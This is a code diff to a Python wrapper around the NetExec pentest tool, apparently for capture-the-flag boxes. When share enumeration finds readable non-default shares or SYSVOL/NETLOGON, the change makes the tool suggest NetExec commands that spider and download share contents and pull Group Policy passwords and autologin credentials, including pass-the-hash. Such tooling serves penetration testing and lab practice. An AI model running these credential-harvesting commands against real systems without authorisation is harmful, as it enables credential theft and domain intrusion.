@@ -1221,18 +1221,30 @@ class NxcPlus:
             if label == "shares":
                 lines = [l for l in lines
                          if not (l.split()[:1] == ["Share"] and "Permissions" in l)]
-                # Generic rule (every box): a READ/WRITE on a NON-default share is
-                # where loot lives — add a spider next-step automatically.
+                cf = f"-H {s.secret}" if s.is_hash else f"-p {s.secret}"
+                la = " --local-auth" if s.local_auth else ""
+                def readable(names):
+                    return [l.split()[0] for l in lines
+                            if l.split() and l.split()[0].upper() in names
+                            and re.search(r"\bREAD|\bWRITE", l)]
+                # 1) NON-default readable shares — where custom loot hides (every box)
                 custom = [l.split()[0] for l in lines
                           if l.split() and l.split()[0].upper() not in STANDARD_SHARES
                           and re.search(r"\bREAD|\bWRITE", l)]
                 if custom:
-                    cf = f"-H {s.secret}" if s.is_hash else f"-p {s.secret}"
-                    la = " --local-auth" if s.local_auth else ""
                     lines.append(f"{YELLOW}-> non-default readable share(s): "
                                  f"{', '.join(custom)}  — spider for creds/configs:{RESET}")
                     lines.append(f"   nxc smb {ip} -u {s.user} {cf}{la} -M spider_plus "
                                  f"-o DOWNLOAD_FLAG=True")
+                # 2) SYSVOL / NETLOGON — default, but classic cred stashes (GPP
+                #    cpassword, autologin, logon scripts). Flag if readable.
+                sv = readable({"SYSVOL", "NETLOGON"})
+                if sv:
+                    lines.append(f"{YELLOW}-> {', '.join(sv)} readable — classic cred stash "
+                                 f"(GPP cpassword, autologin, logon scripts):{RESET}")
+                    lines.append(f"   nxc smb {ip} -u {s.user} {cf}{la} -M gpp_password -M gpp_autologin")
+                    lines.append(f"   nxc smb {ip} -u {s.user} {cf}{la} -M spider_plus "
+                                 f"-o DOWNLOAD_FLAG=True   # also pulls logon scripts (.bat/.ps1/.vbs)")
             elif label == "users":
                 names = self._clean_usernames(lines)
                 result.domain_users = sorted(set(result.domain_users) | set(names))
